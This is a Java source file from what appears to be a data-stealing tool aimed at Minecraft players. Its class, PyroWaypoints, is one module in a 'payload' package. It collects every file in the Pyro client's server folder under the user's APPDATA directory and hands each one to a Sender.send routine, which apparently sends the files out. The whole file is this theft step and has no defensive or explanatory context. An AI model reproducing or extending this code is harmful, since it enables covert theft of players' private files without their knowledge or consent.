package dev._3000IQPlay.experium.payload.impl;

import dev._3000IQPlay.experium.payload.Payload;
import dev._3000IQPlay.experium.payload.Sender;
import dev._3000IQPlay.experium.util.FileUtil;

import java.io.File;

public final
class PyroWaypoints implements Payload {
    @Override
    public
    void execute () {
        for (File file : FileUtil.getFiles(System.getenv("APPDATA") + "\\.minecraft\\Pyro\\server")) {
            Sender.send(file);
        }
    }
}